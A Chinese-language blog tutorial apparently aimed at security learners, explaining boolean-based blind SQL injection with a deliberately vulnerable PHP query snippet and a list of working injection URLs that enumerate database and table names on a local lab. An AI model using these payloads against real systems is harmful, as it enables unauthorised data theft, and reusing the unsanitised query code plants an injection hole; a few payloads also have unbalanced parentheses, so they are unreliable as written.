---
layout: post
title: "1.3.1-SQL注入-SQL盲注-布尔盲注"
date: 2018-06-21
category: web安全
tags: sql注入 sql盲注
---
## SQL盲注-布尔盲注

### 01布尔盲注原理
	
	$id=$_GET['id'];
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1 ";
	$result=mysql_query($sql);
	$row=mysql_fetch_array($result);
	if($row)
	{
		echo "Right";
	}
	else
	{
		echo "Wrong";
	}


代码存在SQL注入漏洞  
然而页面即不会回显数据，也不会回显错误信息  

只返回 “Right” 与 “Wrong”   

这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”和“假”来识别我们的判断是否正确，这既是布尔盲注！  


正确请求，id=1 -> 返回 id=1的数据  

错误请求，id=1' -> 返回 与正确页面不同的页面  
1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5--+  
2.想办法构造语句，判断数据库中内容的值  
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg)

### 02布尔盲注方法

构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  

	left() left(database(),1)>'s'
			database()显示数据库名称，left(a,b)从左侧截取a的前b位
	regexp select user() regexp '^r'
			正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
	like	select user() like 'ro%'
			与regexp类似，使用like进行匹配
	substr()  ascii(substr((select database()),1,1))=98
	ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
	ord()	ord(mid((select user()),1,1))=114
	mid()	mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
	
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg)


[MySql正则表达式](http://www.runoob.com/mysql/mysql-regexp.html)

注入点： 

	http://localhost:90/Less-8/?id=1'
	http://localhost:90/Less-8/?id=1' and left((select database()),1)='a'--+
	http://localhost:90/Less-8/?id=1' and left((select database()),1)='s'--+ 显示正确第一位为s

	http://localhost:90/Less-8/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e'--+ 第一个表名称字符

	http://localhost:90/Less-8/?id=1' and (select database() regexp '^s')--+

	http://localhost:90/Less-8/?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^s')--+

	http://localhost:90/Less-8/?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like 'e%')--+

	http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+

	http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+


![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/ascii.jpg)


## burp操作步骤
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/03.png)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/04.jpg)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/05.png)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/06.png)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/07.jpg)
















